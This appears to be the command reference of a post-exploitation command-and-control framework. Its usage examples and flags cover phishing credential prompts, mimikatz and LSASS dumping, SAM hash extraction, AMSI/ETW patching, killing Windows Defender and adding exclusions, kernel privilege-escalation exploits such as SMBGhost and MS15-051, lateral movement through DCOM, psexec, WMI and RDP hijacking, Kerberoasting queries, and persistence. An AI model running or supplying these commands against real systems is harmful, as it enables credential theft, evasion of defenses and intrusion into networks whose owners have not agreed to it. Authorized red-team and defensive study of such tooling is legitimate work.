## community
### askcreds

Prompt for credentials

```
askcreds [flags]
```

**Options**

```
  -h, --help                 print help
      --note string          note to display (default "Please verify your Windows user credentials to proceed")
  -f, --output_file string   output file
      --prompt string        prompt to display (default "Restore Network Connection")
      --wait_time int        password to dump credentials for (default 30)
      --wizard               Start interactive wizard mode
```

### autologon

Dump the autologon credentials

```
autologon [flags]
```

**Options**

```
  -h, --help                 print help
  -f, --output_file string   output file
      --wizard               Start interactive wizard mode
```

### bof-execute_assembly

Execute .NET assemblies with inline execution and patching

**Description**

Execute .NET assemblies with inline execution and optional patching capabilities.

**Examples:**

```
bof-execute_assembly C:\Tools\Seatbelt.exe
bof-execute_assembly C:\Tools\Seatbelt.exe --amsi --etw
bof-execute_assembly C:\Tools\Rubeus.exe --args "kerberoast /outfile:hashes"
bof-execute_assembly C:\Tools\SharpHound.exe --patchexit
```

**Legacy positional format (still supported):**

```
bof-execute_assembly C:\Tools\Seatbelt.exe --amsi --etw AntiVirus
bof-execute_assembly C:\Tools\Rubeus.exe kerberoast /outfile:hashes --amsi
```

**Options:**

- `--amsi`: Patch AMSI (Anti-Malware Scan Interface) before execution
- `--etw`: Patch ETW (Event Tracing for Windows) before execution
- `--patchexit`: Patch exit functions to prevent assembly from terminating the process
- `--args`: Arguments to pass to the .NET assembly

> Inline execution without dropping files to disk. This technique loads and executes .NET assemblies directly in memory.


```
bof-execute_assembly [flags]
```

**Options**

```
      --amsi                 Patch AMSI before execution
      --args string          Arguments to pass to the assembly
      --etw                  Patch ETW before execution
  -h, --help                 print help
  -f, --output_file string   output file
      --patchexit            Patch exit functions
      --wizard               Start interactive wizard mode
```

### credman

Dump the Credential Manager credentials

```
credman [flags]
```

**Options**

```
  -h, --help                 print help
  -f, --output_file string   output file
      --wizard               Start interactive wizard mode
```

### curl

HTTP client tool <host> [options]

```
curl [flags]
```

**Options**

```
      --body string          request body
      --disable-output       disable output display
      --header string        custom header
  -h, --help                 print help
      --host string          target host
      --method string        HTTP method (GET, POST, PUT, PATCH, DELETE) (default "GET")
      --noproxy              disable proxy usage
  -f, --output_file string   output file
      --port int             target port
      --useragent string     custom user agent
      --wizard               Start interactive wizard mode
```

### dir

List directory contents [path]

```
dir [flags]
```

**Options**

```
  -h, --help                 print help
  -f, --output_file string   output file
      --path string          directory path to list
      --subdirs              include subdirectories (optional)
      --wizard               Start interactive wizard mode
```

### dump_sam

Dump the SAM, SECURITY and SYSTEM registries [location]

**Description**

**Positional arguments format:**

```
dump_sam                           # Use default location (C:\Windows\Temp\)
dump_sam C:\temp\                  # Specify custom location
dump_sam "C:\My Folder\"           # Location with spaces
```

**Flag format:**

```
dump_sam --location C:\temp\
dump_sam --location "C:\My Folder\"
```

> Requires administrator privileges


```
dump_sam [flags]
```

**Options**

```
  -h, --help                 print help
      --location string      folder to save (optional) (default "C:\\Windows\\Temp\\")
  -f, --output_file string   output file
      --wizard               Start interactive wizard mode
```

### elevate



**SEE ALSO**

* [elevate EfsPotato](#elevate-EfsPotato)	 - EfsPotato privilege escalation with auto CLR detection
* [elevate HiveNightmare](#elevate-HiveNightmare)	 - HiveNightmare privilege escalation
* [elevate JuicyPotato](#elevate-JuicyPotato)	 - JuicyPotato privilege escalation
* [elevate SharpHiveNightmare](#elevate-SharpHiveNightmare)	 - SharpHiveNightmare privilege escalation with auto CLR detection
* [elevate SweetPotato](#elevate-SweetPotato)	 - SweetPotato privilege escalation with auto CLR detection
* [elevate cve-2020-0796](#elevate-cve-2020-0796)	 - CVE-2020-0796 (SMBGhost) privilege escalation
* [elevate ms14-058](#elevate-ms14-058)	 - MS14-058 (CVE-2014-4113) privilege escalation
* [elevate ms15-051](#elevate-ms15-051)	 - MS15-051 (CVE-2015-1701) privilege escalation
* [elevate ms16-016](#elevate-ms16-016)	 - MS16-016 (CVE-2016-0051) privilege escalation (x86 only)
* [elevate ms16-032](#elevate-ms16-032)	 - MS16-032 PowerShell privilege escalation

#### elevate EfsPotato

EfsPotato privilege escalation with auto CLR detection

**Description**

EfsPotato privilege escalation with automatic CLR version detection.

**Command execution:**

```
elevate EfsPotato --command "whoami"
elevate EfsPotato --command "powershell -enc <base64>"
```

**Shellcode execution:**

```
elevate EfsPotato
elevate EfsPotato --shellcode-file /path/to/sc.bin
elevate EfsPotato --shellcode-artifact beacon_x64
```

Priority: `command` > `shellcode-artifact` > `shellcode-file` > `self_stager`

> Exploits the MS-EFSR protocol. Auto-selects .NET 3.5 or 4.0 based on system CLR version.


```
elevate EfsPotato [flags]
```

**Options**

```
      --command string              Execute a command (e.g., 'whoami', 'cmd.exe /c <cmd>')
  -h, --help                        print help
  -f, --output_file string          output file
      --shellcode-artifact string   Artifact ID for shellcode payload
      --shellcode-file string       Path to raw shellcode file for injection
      --wizard                      Start interactive wizard mode
```

**SEE ALSO**

* [elevate](#elevate)	 - 

#### elevate HiveNightmare

HiveNightmare privilege escalation

```
elevate HiveNightmare [flags]
```

**Options**

```
  -h, --help                 print help
  -f, --output_file string   output file
      --wizard               Start interactive wizard mode
```

**SEE ALSO**

* [elevate](#elevate)	 - 

#### elevate JuicyPotato

JuicyPotato privilege escalation

**Description**

JuicyPotato privilege escalation tool.

**Examples:**

```
elevate JuicyPotato --type t --program "C:\Windows\Temp\malefic-demo.exe" --port 1116
```

**Parameters:**

- `--type`: CreateProcess call type (`t` = CreateProcessWithTokenW, `u` = CreateProcessAsUser, `*` = auto)
- `--program`: Program to launch (default: cmd.exe)
- `--port`: COM server listening port (default: 1337)
- `--clsid`: CLSID for COM object (default: {8BC3F05E-D86B-11D0-A075-00C04FB68820})
- `--arguments`: Arguments to pass to the launched program

**Common CLSIDs:**

- `{8BC3F05E-D86B-11D0-A075-00C04FB68820}` (BITS)
- `{BB64F8A7-BEE7-4E1A-AB8D-7D8273F7FDB6}` (Windows Media Player)
- `{03ca98d6-ff5d-49b8-abc6-03dd84127020}` (Automatic Proxy Configuration)

> Requires specific Windows versions and CLSID compatibility.


```
elevate JuicyPotato [flags]
```

**Options**

```
      --arguments string     Arguments to pass to the program
      --clsid string         CLSID to use for COM object (default "{8BC3F05E-D86B-11D0-A075-00C04FB68820}")
  -h, --help                 print help
  -f, --output_file string   output file
      --port string          COM server listening port (default "1337")
      --program string       Program to launch (default "c:\\windows\\system32\\cmd.exe")
      --type string          CreateProcess call type (t=CreateProcessWithTokenW, u=CreateProcessAsUser, *=auto) (default "t")
      --wizard               Start interactive wizard mode
```

**SEE ALSO**

* [elevate](#elevate)	 - 

#### elevate SharpHiveNightmare

SharpHiveNightmare privilege escalation with auto CLR detection

**Description**

SharpHiveNightmare (CVE-2021-36934) privilege escalation.

**Usage:**

```
elevate SharpHiveNightmare
```

> Auto-selects .NET 4.0 or 4.5 based on system CLR version. Leverages shadow copies of SAM/SYSTEM files.


```
elevate SharpHiveNightmare [flags]
```

**Options**

```
  -h, --help                 print help
  -f, --output_file string   output file
      --wizard               Start interactive wizard mode
```

**SEE ALSO**

* [elevate](#elevate)	 - 

#### elevate SweetPotato

SweetPotato privilege escalation with auto CLR detection

**Description**

SweetPotato privilege escalation with automatic CLR version detection.

**Command execution:**

```
elevate SweetPotato --command "whoami"
elevate SweetPotato --command "powershell -enc <base64>"
```

**Shellcode execution:**

```
elevate SweetPotato
elevate SweetPotato --shellcode-file /path/to/sc.bin
elevate SweetPotato --shellcode-artifact beacon_x64
```

**Advanced options (shellcode mode):**

- `--listener-port`: COM server listening port (default: 12333)
- `--target-process`: Process to spawn for injection (default: cmd.exe)

Priority: `command` > `shellcode-artifact` > `shellcode-file` > `self_stager`


```
elevate SweetPotato [flags]
```

**Options**

```
      --command string              Execute a command (e.g., 'whoami', 'cmd.exe /c <cmd>')
  -h, --help                        print help
      --listener-port string        COM server listening port (default "12333")
  -f, --output_file string          output file
      --shellcode-artifact string   Artifact ID for shellcode payload
      --shellcode-file string       Path to raw shellcode file for injection
      --target-process string       Target process for shellcode injection (default "c:\\windows\\system32\\cmd.exe")
      --wizard                      Start interactive wizard mode
```

**SEE ALSO**

* [elevate](#elevate)	 - 

#### elevate cve-2020-0796

CVE-2020-0796 (SMBGhost) privilege escalation

**Description**

CVE-2020-0796 (SMBGhost) privilege escalation exploit.

**Examples:**

```
elevate cve-2020-0796
elevate cve-2020-0796 --shellcode-file C:\payload.bin
elevate cve-2020-0796 --shellcode-artifact beacon_x64
```

Priority: `shellcode-artifact` > `shellcode-file` > `self_stager`

**Requirements:** x64 architecture ONLY.

**Affected Systems:** Windows 10 Version 1903/1909, Windows Server Version 1903/1909.

> Targets the SMBv3 compression vulnerability in srv2.sys.


```
elevate cve-2020-0796 [flags]
```

**Options**

```
  -h, --help                        print help
  -f, --output_file string          output file
      --shellcode-artifact string   Artifact ID for shellcode payload
      --shellcode-file string       Path to raw shellcode file for injection
      --wizard                      Start interactive wizard mode
```

**SEE ALSO**

* [elevate](#elevate)	 - 

#### elevate ms14-058

MS14-058 (CVE-2014-4113) privilege escalation

**Description**

MS14-058 (CVE-2014-4113) kernel privilege escalation exploit.

**Examples:**

```
elevate ms14-058
elevate ms14-058 --shellcode-file C:\payload.bin
elevate ms14-058 --shellcode-artifact beacon_x64
```

Priority: `shellcode-artifact` > `shellcode-file` > `self_stager`

**Affected Systems:** Windows 7 SP1, Windows 8.1, Windows Server 2008 R2 SP1, Windows Server 2012/2012 R2.

> Targets a vulnerability in win32k.sys. Supports both x86 and x64.


```
elevate ms14-058 [flags]
```

**Options**

```
  -h, --help                        print help
  -f, --output_file string          output file
      --shellcode-artifact string   Artifact ID for shellcode payload
      --shellcode-file string       Path to raw shellcode file for injection
      --wizard                      Start interactive wizard mode
```

**SEE ALSO**

* [elevate](#elevate)	 - 

#### elevate ms15-051

MS15-051 (CVE-2015-1701) privilege escalation

**Description**

MS15-051 (CVE-2015-1701) kernel privilege escalation exploit.

**Examples:**

```
elevate ms15-051
elevate ms15-051 --shellcode-file C:\payload.bin
elevate ms15-051 --shellcode-artifact beacon_x64
```

Priority: `shellcode-artifact` > `shellcode-file` > `self_stager`

**Affected Systems:** Windows 7 SP1, Windows 8.1, Windows Server 2008 R2 SP1, Windows Server 2012/2012 R2.

> Targets a vulnerability in win32k.sys. Supports both x86 and x64.


```
elevate ms15-051 [flags]
```

**Options**

```
  -h, --help                        print help
  -f, --output_file string          output file
      --shellcode-artifact string   Artifact ID for shellcode payload
      --shellcode-file string       Path to raw shellcode file for injection
      --wizard                      Start interactive wizard mode
```

**SEE ALSO**

* [elevate](#elevate)	 - 

#### elevate ms16-016

MS16-016 (CVE-2016-0051) privilege escalation (x86 only)

**Description**

MS16-016 (CVE-2016-0051) kernel privilege escalation exploit.

**Examples:**

```
elevate ms16-016
elevate ms16-016 --shellcode-file C:\payload.bin
elevate ms16-016 --shellcode-artifact beacon_x86
```

Priority: `shellcode-artifact` > `shellcode-file` > `self_stager`

**Requirements:** x86 architecture ONLY (will fail on x64).

**Affected Systems:** Windows Vista SP2, Windows 7 SP1, Windows 8.1, Windows Server 2008/2008 R2/2012 (all x86 only).

> Targets a vulnerability in WebDAV client (mrxdav.sys).


```
elevate ms16-016 [flags]
```

**Options**

```
  -h, --help                        print help
  -f, --output_file string          output file
      --shellcode-artifact string   Artifact ID for shellcode payload
      --shellcode-file string       Path to raw shellcode file for injection
      --wizard                      Start interactive wizard mode
```

**SEE ALSO**

* [elevate](#elevate)	 - 

#### elevate ms16-032

MS16-032 PowerShell privilege escalation

```
elevate ms16-032 [flags]
```

**Options**

```
  -h, --help                 print help
  -f, --output_file string   output file
      --wizard               Start interactive wizard mode
```

**SEE ALSO**

* [elevate](#elevate)	 - 

### enum



**SEE ALSO**

* [enum arp](#enum-arp)	 - Enum ARP table
* [enum av](#enum-av)	 - Check for antivirus software
* [enum dc](#enum-dc)	 - Enumerate domain information using Active Directory Domain Services
* [enum dns](#enum-dns)	 - Enum DNS configuration
* [enum dotnet_process](#enum-dotnet_process)	 - Find processes that most likely have .NET loaded.
* [enum drives](#enum-drives)	 - Enumerate system drives
* [enum files](#enum-files)	 - Enumerate files <directory> <pattern> [keyword]
* [enum localcert](#enum-localcert)	 - Enumerate local certificates <store>
* [enum localsessions](#enum-localsessions)	 - Enumerate local user sessions
* [enum software](#enum-software)	 - Enum software

#### enum arp

Enum ARP table

```
enum arp [flags]
```

**Options**

```
  -h, --help                 print help
  -f, --output_file string   output file
      --wizard               Start interactive wizard mode
```

**SEE ALSO**

* [enum](#enum)	 - 

#### enum av

Check for antivirus software

```
enum av [flags]
```

**Options**

```
  -h, --help                 print help
  -f, --output_file string   output file
      --wizard               Start interactive wizard mode
```

**SEE ALSO**

* [enum](#enum)	 - 

#### enum dc

Enumerate domain information using Active Directory Domain Services

```
enum dc [flags]
```

**Options**

```
  -h, --help                 print help
  -f, --output_file string   output file
      --wizard               Start interactive wizard mode
```

**SEE ALSO**

* [enum](#enum)	 - 

#### enum dns

Enum DNS configuration

```
enum dns [flags]
```

**Options**

```
  -h, --help                 print help
  -f, --output_file string   output file
      --wizard               Start interactive wizard mode
```

**SEE ALSO**

* [enum](#enum)	 - 

#### enum dotnet_process

Find processes that most likely have .NET loaded.

```
enum dotnet_process [flags]
```

**Options**

```
  -h, --help                 print help
  -f, --output_file string   output file
      --wizard               Start interactive wizard mode
```

**SEE ALSO**

* [enum](#enum)	 - 

#### enum drives

Enumerate system drives

```
enum drives [flags]
```

**Options**

```
  -h, --help                 print help
  -f, --output_file string   output file
      --wizard               Start interactive wizard mode
```

**SEE ALSO**

* [enum](#enum)	 - 

#### enum files

Enumerate files <directory> <pattern> [keyword]

```
enum files [flags]
```

**Options**

```
      --directory string     directory path to search
  -h, --help                 print help
      --keyword string       optional keyword filter
  -f, --output_file string   output file
      --pattern string       search pattern (e.g., *.txt)
      --wizard               Start interactive wizard mode
```

**SEE ALSO**

* [enum](#enum)	 - 

#### enum localcert

Enumerate local certificates <store>

```
enum localcert [flags]
```

**Options**

```
  -h, --help                 print help
  -f, --output_file string   output file
      --store string         certificate store name
      --wizard               Start interactive wizard mode
```

**SEE ALSO**

* [enum](#enum)	 - 

#### enum localsessions

Enumerate local user sessions

```
enum localsessions [flags]
```

**Options**

```
  -h, --help                 print help
  -f, --output_file string   output file
      --wizard               Start interactive wizard mode
```

**SEE ALSO**

* [enum](#enum)	 - 

#### enum software

Enum software

```
enum software [flags]
```

**Options**

```
  -h, --help                 print help
  -f, --output_file string   output file
      --wizard               Start interactive wizard mode
```

**SEE ALSO**

* [enum](#enum)	 - 

### exclusion



**SEE ALSO**

* [exclusion add](#exclusion-add)	 - Add Windows Defender exclusion <type> <data>
* [exclusion delete](#exclusion-delete)	 - Delete Windows Defender exclusion <type> <data>
* [exclusion enum](#exclusion-enum)	 - Enumerate Windows Defender exclusions

#### exclusion add

Add Windows Defender exclusion <type> <data>

```
exclusion add [flags]
```

**Options**

```
      --data string          exclusion data
  -h, --help                 print help
  -f, --output_file string   output file
      --type string          exclusion type (path, process, extension)
      --wizard               Start interactive wizard mode
```

**SEE ALSO**

* [exclusion](#exclusion)	 - 

#### exclusion delete

Delete Windows Defender exclusion <type> <data>

```
exclusion delete [flags]
```

**Options**

```
      --data string          exclusion data
  -h, --help                 print help
  -f, --output_file string   output file
      --type string          exclusion type (path, process, extension)
      --wizard               Start interactive wizard mode
```

**SEE ALSO**

* [exclusion](#exclusion)	 - 

#### exclusion enum

Enumerate Windows Defender exclusions

```
exclusion enum [flags]
```

**Options**

```
  -h, --help                 print help
  -f, --output_file string   output file
      --wizard               Start interactive wizard mode
```

**SEE ALSO**

* [exclusion](#exclusion)	 - 

### execute_cross_session

Execute a binary on disk within the context of another logged-on user's session

```
execute_cross_session [flags]
```

**Options**

```
      --binary_path string   path to the binary that you like to execute
  -h, --help                 print help
  -f, --output_file string   output file
      --session_id int       the session ID of the user in which context the specified binary needs to be executed.
      --wizard               Start interactive wizard mode
```

### hashdump

Dump the SAM, SECURITY and SYSTEM registries

```
hashdump [flags]
```

**Options**

```
  -h, --help                 print help
  -f, --output_file string   output file
      --wizard               Start interactive wizard mode
```

### ipconfig

Display network configuration

```
ipconfig [flags]
```

**Options**

```
  -h, --help                 print help
  -f, --output_file string   output file
      --wizard               Start interactive wizard mode
```

### kill_defender

Kill or check Windows Defender <action>

```
kill_defender [flags]
```

**Options**

```
      --action string        action to perform (kill or check) (default "check")
  -h, --help                 print help
  -f, --output_file string   output file
      --wizard               Start interactive wizard mode
```

### klist

Interact with cached Kerberos tickets [action] [spn]

```
klist [flags]
```

**Options**

```
      --action string        action to perform (get, purge, or empty to list)
  -h, --help                 print help
  -f, --output_file string   output file
      --spn string           target SPN (required for 'get' action)
      --wizard               Start interactive wizard mode
```

### ldapsearch

Perform LDAP search <query> [attributes] [result_count] [hostname] [domain]

**Description**

**Flag format:**

```
ldapsearch --query "(&(objectClass=user)(samAccountName=admin*))"
ldapsearch --query "(&(objectClass=computer))" --attributes "name,operatingSystem" --result-count 10
```

**Positional arguments format:**

```
ldapsearch "(&(objectClass=user))" "" 0 "" ""
ldapsearch "(&(objectClass=computer))" "name,operatingSystem" 10 "dc01.domain.com" "DC=domain,DC=com"
```

**Useful queries:**

Kerberoastable accounts:

```
ldapsearch "(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))"
```

AS-REP Roastable accounts:

```
ldapsearch "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
```

Passwords with reversible encryption:

```
ldapsearch "(&(objectClass=user)(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=128))"
```

For Bloodhound ACL data:

```
ldapsearch "(&(objectClass=user))" "*,ntsecuritydescriptor"
```

**Defaults:** Empty attributes = all, 0 result_count = all, empty hostname = Primary DC, empty domain = Base domain.

> If paging fails, consider using nonpagedldapsearch instead.


```
ldapsearch [flags]
```

**Options**

```
      --attributes string     comma separated attributes (empty for all)
      --domain string         Distinguished Name to use (empty for Base domain)
  -h, --help                  print help
      --hostname string       DC hostname or IP (empty for Primary DC)
  -f, --output_file string    output file
      --query string          LDAP query string
      --result-count string   maximum number of results (0 for all) (default "0")
      --wizard                Start interactive wizard mode
```

### load_prebuild

load full|fs|execute|sys|rem precompiled modules

```
load_prebuild [flags]
```

**Options**

```
  -h, --help                 print help
  -f, --output_file string   output file
      --wizard               Start interactive wizard mode
```

### logonpasswords

Extract logon passwords using mimikatz

```
logonpasswords [flags]
```

**Options**

```
  -h, --help                 print help
  -f, --output_file string   output file
      --wizard               Start interactive wizard mode
```

### memoryinfo

Get system memory information

```
memoryinfo [flags]
```

**Options**

```
  -h, --help                 print help
  -f, --output_file string   output file
      --wizard               Start interactive wizard mode
```

### memreader

Read memory from target process <target-pid> <pattern> [output-size]

```
memreader [flags]
```

**Options**

```
  -h, --help                 print help
      --output-size string   output size limit (default "10")
  -f, --output_file string   output file
      --pattern string       memory pattern to search
      --target-pid string    target process ID
      --wizard               Start interactive wizard mode
```

### mimikatz

Execute mimikatz with specified commands

**Description**

**Positional arguments format:**

```
mimikatz coffee
mimikatz privilege::debug sekurlsa::logonpasswords
mimikatz "privilege::debug" "sekurlsa::logonpasswords"
```

**Common credential extraction:**

```
mimikatz privilege::debug sekurlsa::logonpasswords
mimikatz privilege::debug sekurlsa::wdigest
mimikatz privilege::debug sekurlsa::kerberos
```

**Registry dumps:**

```
mimikatz privilege::debug lsadump::sam
mimikatz privilege::debug lsadump::secrets
```

**Other commands:**

```
mimikatz kerberos::list
mimikatz crypto::capi
mimikatz vault::list
```

> Most commands require administrator privileges. "exit" command is automatically appended.


```
mimikatz [flags]
```

**Options**

```
  -h, --help                 print help
  -f, --output_file string   output file
      --wizard               Start interactive wizard mode
```

### move



**SEE ALSO**

* [move dcom](#move-dcom)	 - Execute command on remote host via DCOM <target> <command> [parameters]
* [move krb_ptt](#move-krb_ptt)	 - Submit a Kerberos TGT ticket (Pass-the-Ticket)
* [move psexec](#move-psexec)	 - Execute service on target host using psexec <host> <service_name> <local_path>
* [move rdphijack](#move-rdphijack)	 - Hijack RDP session <session_id> <target_session_id> [mode argument]
* [move wmi-eventsub](#move-wmi-eventsub)	 - Execute VBScript via WMI Event Subscription <target> <script_path> [username password domain]
* [move wmi-proccreate](#move-wmi-proccreate)	 - Create process via WMI on remote host <target> <command> [username password domain]

#### move dcom

Execute command on remote host via DCOM <target> <command> [parameters]

**Description**

**Positional arguments format:**

```
move dcom 192.168.1.100 "c:\windows\system32\calc.exe"
move dcom DOMAIN-DC "c:\windows\system32\cmd.exe" "/c whoami"
```

**Flag format (current user):**

```
move dcom --target 192.168.1.100 --cmd "c:\windows\system32\calc.exe"
```

**Flag format (explicit credentials):**

```
move dcom --target 192.168.1.100 --username admin --password P@ssw0rd --domain CONTOSO --cmd "c:\windows\system32\cmd.exe" --parameters "/c whoami"
```

> Uses DCOM for lateral movement. If username is empty, uses current user credentials. Default command is cmd.exe.


```
move dcom [flags]
```

**Options**

```
      --cmd string           command to execute (default "c:\\windows\\system32\\cmd.exe")
      --domain string        domain
  -h, --help                 print help
  -f, --output_file string   output file
      --parameters string    command parameters
      --password string      password
      --target string        target host
      --username string      username (empty for current user)
      --wizard               Start interactive wizard mode
```

**SEE ALSO**

* [move](#move)	 - 

#### move krb_ptt

Submit a Kerberos TGT ticket (Pass-the-Ticket)

**Description**

Kerberos Pass-the-Ticket (PTT) - Submit a TGT or TGS ticket for authentication.

**Positional arguments format:**

```
move krb_ptt <base64_ticket>
move krb_ptt <base64_ticket> <luid>
```

**Flag format (direct base64):**

```
move krb_ptt --ticket <base64_ticket>
move krb_ptt --ticket <base64_ticket> --luid 0x3e7
```

**Flag format (from file):**

```
move krb_ptt --ticket-file /path/to/ticket.kirbi
move krb_ptt --ticket-base64-file /path/to/ticket.txt --luid 0x3e7
```

**Parameters:**

- `--ticket` - Base64 encoded Kerberos ticket (direct input)
- `--ticket-file` - Path to raw binary ticket file (.kirbi format)
- `--ticket-base64-file` - Path to file containing base64 encoded ticket
- `--luid` - Optional target Logon Session ID (LUID)

Priority: `--ticket` > `--ticket-base64-file` > `--ticket-file`

> Ticket sources: Rubeus (base64), Mimikatz (.kirbi), impacket (.ccache → .kirbi).


```
move krb_ptt [flags]
```

**Options**

```
  -h, --help                        print help
      --luid string                 Target LUID (Logon ID) - optional
  -f, --output_file string          output file
      --ticket string               Base64 encoded Kerberos ticket (direct input)
      --ticket-base64-file string   Path to base64 encoded ticket file
      --ticket-file string          Path to raw binary ticket file (.kirbi)
      --wizard                      Start interactive wizard mode
```

**SEE ALSO**

* [move](#move)	 - 

#### move psexec

Execute service on target host using psexec <host> <service_name> <local_path>

**Description**

**Positional arguments format:**

```
move psexec DOMAIN-DC AgentSvc /tmp/MyAgentSvc.exe
move psexec 192.168.1.100 TestService C:\tools\service.exe
```

**Flag format:**

```
move psexec --host DOMAIN-DC --service AgentSvc --path /tmp/MyAgentSvc.exe
move psexec --host 192.168.1.100 --service TestService --path C:\tools\service.exe
```

> Requires administrator privileges on target host. Service executable will be copied to C:\Windows\ on target.


```
move psexec [flags]
```

**Options**

```
  -h, --help                 print help
      --host string          target host
  -f, --output_file string   output file
      --path string          local path to service executable
      --service string       service name
      --wizard               Start interactive wizard mode
```

**SEE ALSO**

* [move](#move)	 - 

#### move rdphijack

Hijack RDP session <session_id> <target_session_id> [mode argument]

**Description**

**Positional arguments format:**

Redirect session 2 to session 1 (requires SYSTEM privilege):

```
move rdphijack 1 2
```

With password (requires high integrity):

```
move rdphijack 1 2 password P@ssw0rd123
```

On remote server (requires user token/ticket):

```
move rdphijack 1 2 server SQL01.lab.internal
```

**Flag format:**

```
move rdphijack --session 1 --target 2
move rdphijack --session 1 --target 2 --mode password --argument P@ssw0rd123
move rdphijack --session 1 --target 2 --mode server --argument SQL01.lab.internal
```

**Modes:**

- `(none)` - Direct hijack, requires SYSTEM privilege
- `password` - Use password of target session owner, requires high integrity
- `server` - Remote server hijack, requires token/ticket of session owner


```
move rdphijack [flags]
```

**Options**

```
      --argument string      password or server name
  -h, --help                 print help
      --mode string          mode: 'password' or 'server'
  -f, --output_file string   output file
      --session int          your console session id
      --target int           target session id to hijack
      --wizard               Start interactive wizard mode
```

**SEE ALSO**

* [move](#move)	 - 

#### move wmi-eventsub

Execute VBScript via WMI Event Subscription <target> <script_path> [username password domain]

**Description**

**Positional arguments format (current user):**

```
move wmi-eventsub 192.168.1.100 /tmp/payload.vbs
```

**Positional arguments format (explicit credentials):**

```
move wmi-eventsub 192.168.1.100 /tmp/payload.vbs admin P@ssw0rd CONTOSO
```

**Flag format (current user):**

```
move wmi-eventsub --target 192.168.1.100 --script /tmp/payload.vbs
```

**Flag format (explicit credentials):**

```
move wmi-eventsub --target 192.168.1.100 --username admin --password P@ssw0rd --domain CONTOSO --script /tmp/payload.vbs
```

> Uses WMI Event Subscription for persistent VBScript execution. If username is empty, uses current user credentials. x86 not supported.


```
move wmi-eventsub [flags]
```

**Options**

```
      --domain string        domain
  -h, --help                 print help
  -f, --output_file string   output file
      --password string      password
      --script string        local path to VBScript file
      --target string        target host
      --username string      username (empty for current user)
      --wizard               Start interactive wizard mode
```

**SEE ALSO**

* [move](#move)	 - 

#### move wmi-proccreate

Create process via WMI on remote host <target> <command> [username password domain]

**Description**

**Positional arguments format (current user):**

```
move wmi-proccreate 192.168.1.100 "calc.exe"
move wmi-proccreate DOMAIN-DC "powershell.exe -c whoami"
```

**Positional arguments format (explicit credentials):**

```
move wmi-proccreate 192.168.1.100 "calc.exe" admin P@ssw0rd CONTOSO
```

**Flag format (current user):**

```
move wmi-proccreate --target 192.168.1.100 --command "calc.exe"
```

**Flag format (explicit credentials):**

```
move wmi-proccreate --target 192.168.1.100 --username admin --password P@ssw0rd --domain CONTOSO --command "powershell.exe -c whoami"
```

> Uses WMI Win32_Process Create method. If username is empty, uses current user credentials. x86 not supported.


```
move wmi-proccreate [flags]
```

**Options**

```
      --command string       command to execute
      --domain string        domain
  -h, --help                 print help
  -f, --output_file string   output file
      --password string      password
      --target string        target host
      --username string      username (empty for current user)
      --wizard               Start interactive wizard mode
```

**SEE ALSO**

* [move](#move)	 - 

### nanodump

Advanced LSASS memory dumping tool

**Description**

**Basic LSASS dump:**

```
nanodump
```

**Write minidump to disk with valid signature:**

```
nanodump --valid --write --write-path C:\Windows\Temp\lsass.dmp
```

**Use fork and spoof callstack:**

```
nanodump --fork --spoof-callstack
```

**Use shtinkering technique (requires admin):**

```
nanodump --shtinkering
```

**Get LSASS PID only:**

```
nanodump --getpid
```


```
nanodump [flags]
```

**Options**

```
      --chunk-size string                  chunk size in KB (default: 924)
      --duplicate                          duplicate an existing LSASS handle
      --duplicate-elevate                  duplicate and elevate handle
      --elevate-handle                     elevate handle privileges
      --fork                               fork the target process
      --getpid                             get the PID of LSASS and exit
  -h, --help                               print help
  -f, --output_file string                 output file
      --pid string                         target process PID (default: auto-detect LSASS)
      --seclogon-duplicate                 use SecLogon duplicate
      --seclogon-leak-local                use SecLogon leak (local)
      --seclogon-leak-remote               use SecLogon leak (remote)
      --seclogon-leak-remote-path string   path for remote SecLogon leak binary
      --shtinkering                        use LSASS shtinkering technique
      --silent-process-exit                use silent process exit
      --silent-process-exit-path string    path for silent process exit
      --snapshot                           snapshot the target process
      --spoof-callstack                    spoof the call stack
      --valid                              create a minidump with a valid signature
      --wizard                             Start interactive wizard mode
      --write                              write minidump to disk
      --write-path string                  path to write the minidump
```

### net



**SEE ALSO**

* [net user](#net-user)	 - 

#### net user



**SEE ALSO**

* [net](#net)	 - 
* [net user add](#net-user-add)	 - Add a new user account <username> <password>
* [net user enum](#net-user-enum)	 - Enumerate network users [type]
* [net user query](#net-user-query)	 - Query user information <username> [domain]

#### net user add

Add a new user account <username> <password>

```
net user add [flags]
```

**Options**

```
  -h, --help                 print help
  -f, --output_file string   output file
      --password string      the password to set
      --username string      the username to add
      --wizard               Start interactive wizard mode
```

**SEE ALSO**

* [net user](#net-user)	 - 

#### net user enum

Enumerate network users [type]

```
net user enum [flags]
```

**Options**

```
  -h, --help                 print help
  -f, --output_file string   output file
      --type string          enumeration type (all, locked, disabled, active) (default "all")
      --wizard               Start interactive wizard mode
```

**SEE ALSO**

* [net user](#net-user)	 - 

#### net user query

Query user information <username> [domain]

```
net user query [flags]
```

**Options**

```
      --domain string        domain name (optional)
  -h, --help                 print help
  -f, --output_file string   output file
      --username string      username to query
      --wizard               Start interactive wizard mode
```

**SEE ALSO**

* [net user](#net-user)	 - 

### nslookup

DNS lookup <hostname> [server] [record-type]

**Description**

**Positional arguments format:**

```
nslookup www.baidu.com
nslookup www.baidu.com 8.8.8.8
nslookup www.baidu.com 8.8.8.8 CNAME
```

**Flag format:**

```
nslookup --host www.baidu.com
nslookup --host www.baidu.com --server 114.114.114.114
nslookup --host www.baidu.com --server 114.114.114.114 --record-type MX
```


```
nslookup [flags]
```

**Options**

```
  -h, --help                 print help
      --host string          hostname or IP to lookup
  -f, --output_file string   output file
      --record-type string   DNS record type (A, NS, CNAME, MX, AAAA, etc.) (default "A")
      --server string        DNS server to use (optional)
      --wizard               Start interactive wizard mode
```

### persistence



**SEE ALSO**

* [persistence BackdoorLnk](#persistence-BackdoorLnk)	 - persistence
* [persistence Install_Service](#persistence-Install_Service)	 - persistence
* [persistence Junction_Folder](#persistence-Junction_Folder)	 - persistence
* [persistence NewLnk](#persistence-NewLnk)	 - persistence
* [persistence Registry_Key](#persistence-Registry_Key)	 - persistence via Windows Registry Key
* [persistence Scheduled_Task](#persistence-Scheduled_Task)	 - persistence
* [persistence WMI_Event](#persistence-WMI_Event)	 - persistence
* [persistence reg_key](#persistence-reg_key)	 - persistence by reg_key
